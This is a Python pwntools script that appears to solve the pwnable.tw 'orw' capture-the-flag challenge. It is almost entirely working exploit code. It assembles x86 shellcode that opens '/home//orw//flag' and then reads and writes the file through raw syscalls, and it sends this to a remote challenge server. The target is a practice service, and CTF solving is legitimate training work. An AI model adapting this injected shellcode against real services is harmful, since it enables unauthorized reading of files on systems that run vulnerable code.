from pwn import *
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
#p = process('./orw')
p = remote('chall.pwnable.tw','10001')
#gdb.attach(p)
shellcode = asm('sub esp, 10')
shellcode += asm('push 0x67616c66')        #string '/home//orw//flag'
shellcode += asm('push 0x2f2f7772')
shellcode += asm('push 0x6f2f2f65')
shellcode += asm('push 0x6d6f682f')
shellcode += asm('xor eax, eax')
shellcode += asm('xor ebx, ebx')
shellcode += asm('xor ecx, ecx')
shellcode += asm('xor edx, edx')
shellcode += asm('mov ebx,esp;')
## flag = 0 ==> read_only
shellcode += asm('mov ecx,0')
#shellcode += asm('mov al,5')
shellcode += asm('mov eax, 0x05')
shellcode += asm('int 0x80')
shellcode += asm('nop')
shellcode += asm('nop')
shellcode += asm('nop')
## read
shellcode += asm('mov ebx, eax')
shellcode += asm('mov ecx, esp')
shellcode += asm('mov edx, 50')
shellcode += asm('mov eax, 0x03')
shellcode += asm('int 0x80')
## white
shellcode += asm('mov ebx, 1')
shellcode += asm('mov eax, 0x04')
shellcode += asm('int 0x80')
p.recv()
p.send(shellcode)
print p.recv()


